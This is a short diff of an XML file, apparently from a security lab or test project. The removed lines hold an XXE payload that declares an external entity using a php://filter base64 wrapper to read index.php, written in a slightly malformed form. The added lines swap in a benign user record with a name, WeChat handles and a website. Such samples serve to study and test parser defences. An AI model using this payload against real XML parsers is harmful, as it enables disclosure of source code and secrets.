@@ -1,6 +1,7 @@
-<?xml version="1.0" encoding="utf-8"?>
-<!DOCTYPE a [
-    <!ENTITY content SYSTEM "SYSTEM "php://filter/convert.base64-encode/resource=index.php">]>
-<foo>
-        <value>%content;</value> 
-</foo>
+<?xml version="1.0" encoding="utf-8" ?>
+<user>
+    <name>Striker</name>
+    <wechat>strikersb</wechat>
+    <public_wechat>sec_fe</public_wechat>
+    <website>http://www.hackersb.cn</website>
+</user>
